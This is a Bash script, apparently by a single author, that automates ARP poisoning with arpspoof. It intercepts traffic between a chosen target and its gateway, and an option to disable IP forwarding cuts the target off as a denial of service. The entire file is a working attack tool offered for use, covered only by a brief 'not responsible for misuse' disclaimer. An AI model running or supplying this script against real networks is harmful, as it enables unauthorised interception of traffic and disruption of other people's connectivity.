#!/bin/bash

# This simple script makes the ARP poisoning technique a little easier
# Use the arpspoof program available without a dsniff package

# I'm not responsible for the misuse of this tool
# Do not use on military or private organizations
# Author: Lucas Vieira de Jesus <lucas.engen.cc@gmail.com>

# Global variables
path_ipforward='/proc/sys/net/ipv4/ip_forward'
target_ip=""
gateway_ip=""
answer=""
interface=""
interfaces_list=""
RED='\x1b[1;31m'
GREEN='\x1b[1;32m'
YELLOW='\x1b[1;33m'
BLUE='\x1b[1;34m'
MAGENTA='\x1b[1;35m'
CYAN='\x1b[1;36m'
RESET='\x1b[0m'
COLS="$(tput cols)"
LINES="$(tput lines)"
AUTHOR="Lucas Vieira"
V_MAJOR="1"
V_MINOR="0"
V_PATCH="2"
LINE_SIZE=62

# Command line parameters
p1="-a"
p2="-d"
p3="--block"
p4="-i"
flag1="true"
flag2="false"

function log_warning()
{
	echo -e "${YELLOW}[!]${RESET} $1"
}

function log_err()
{
	echo -e "${RED}[!]${RESET} $1"
}

function log_info()
{
	echo -e "${BLUE}[*]${RESET} $1"
}

function log_ok()
{
	echo -e "${GREEN}[+]${RESET} $1"
}

function ask()
{
	echo -e "${YELLOW}[?]${RESET} $1"
}

function log_notice()
{
	echo -e "${RED}[*]${RESET} $1"
}

function check_ip_forward()
{
	local disable="$1"

	# Configura o repasse dos pacotes
	if [ "$disable" == "$flag1" ]; then
		# Deverá ser feito uma negação de serviço
		log_info "deactivating ip forwarding ..."
		echo 0 > $path_ipforward
	else
		log_info "activating ip forwarding ..."
		echo 1 > $path_ipforward
	fi
}

function ping_host
{
	local host="$1"

	ping -q -c 4 -b $host > /dev/null
	if [ "$?" == "2" ]; then
		log_err "failed to ping $host"
		exit $?
	fi
	
	if [ "$?" != "0" ]; then
		log_err "failed to connect with $host"
		exit $?
	fi
	
	log_ok "host online: $host"
}

function get_interfaces()
{
	local path="/sys/class/net"

	# List network interfaces
	interfaces="$(ls $path)"
	if [ "$?" != "0" ]; then
		log_err "failed to list available interfaces"
		exit 1
	fi

	log_ok "found network interfaces:"
	for folder in $path/*; do
		interface_name=$(basename $folder)
		if [ -d "$folder/wireless" ]; then
			log_info "$interface_name [wireless]"
		else
			log_info "$interface_name"
		fi
	done

	echo -e "\n"
}

function network_interface_exists()
{
	local path="/sys/class/net"
	local interface_name="$1"

	result="$(find $path/$1 2>&1)"
	if [ "$?" != 0 ]; then
		log_err "the network interface $interface_name doesn't exists"
		exit 1
	fi
}

function show_deps()
{
	log_notice "dnsniff ==> arpspoof"
	draw_horizontal_line $LINE_SIZE
	echo -e "\n"
}

function disable_ipv4_forward()
{
	log_info "disabling ip forward ..."
	echo 0 > $path_ipforward
}

function draw_horizontal_line()
{
	for i in `seq 1 $1`;
	do
		echo -n "_"
	done
}

function show_banner()
{
	local shell_32_dll_path="c:\\windows\\system32\\shell32.dll"
	
	draw_horizontal_line $LINE_SIZE

	echo ""
	log_notice "larp v$V_MAJOR.$V_MINOR.$V_PATCH - tool to automate ARP poisoning"
	log_notice "Author: $AUTHOR"
	log_notice "Date: 25/06/2018"
	log_notice "Dependencies:"
	show_deps

	if [ -e $shell_32_dll_path ]; then
		log_err "i can run only on linux"
		exit 1
	fi
}

function show_usage()
{
	log_info "Usage: $YELLOW$0$RESET $GREEN$p4$RESET <interface> $GREEN$p1$RESET <ip> $GREEN$p2$RESET <ip> $GREEN$p3$RESET [$GREEN $flag1$RESET |$RED $flag2$RESET]"
	log_info "\t$p4: network interface"
	log_info "\t$p1: ip address to be intercepted"
	log_info "\t$p2: ip address where the target sends packets"
	log_info "\t$p3: block network packets from target (DoS)\n"

	# Exibe as interfaces de rede disponíveis
	get_interfaces
}

function validate_ip
{
	ip=$1
	echo $ip | grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"
}

function parse_args()
{
	if [ "$1" != "$p4" ] || [ "$3" != "$p1" ] || [ "$5" != "$p2" ] || [ "$7" != "$p3" ]; then
		log_err "wrong command line"
		return 1
	fi

	if [ "$8" != "$flag1" ] && [ "$8" != "$flag2" ]; then
		log_err "invalid parameter: $8"
		return 1
	fi
}

function main()
{
	local target1=$4
	local target2=$6
	local flag_dos=$8
	local interface=$2

	log_info "starting larp ..."
	if [ "$UID" != "0" ]; then
		log_err "we need root privileges"
		exit 1
	fi

	# Verifica se a interface especificada existe
	network_interface_exists $interface

	# Certifica-se de que o endereço dos alvos é válido
	target1="$(validate_ip $target1)"
	target2="$(validate_ip $target2)"

	log_info "checking targets ..."
	ping_host $target1
	ping_host $target2

	# IP Forwarding
	check_ip_forward $flag_dos

	log_ok "ARP poisoning target '$target1' ..."
	envenenamento="$(arpspoof -i $interface -t $target1 -r $target2)"
	if [ "$?" != "0" ]; then
		log_err "attack failed. Check if dsniff is installed"
	else
		log_ok "attack terminated"
	fi

	disable_ipv4_forward
}

# Verifica se os argumentos foram fornecidos corretamente
if [ $# -ne 8 ]; then
	show_usage
	exit 1
fi

# Analisa os argumentos fornecidos
parse_args $1 $2 $3 $4 $5 $6 $7 $8
if [ $? -ne 0 ]; then
	log_err "invalid arguments passed to script"
	exit 1
fi

# Início
show_banner
main $1 $2 $3 $4 $5 $6 $7 $8
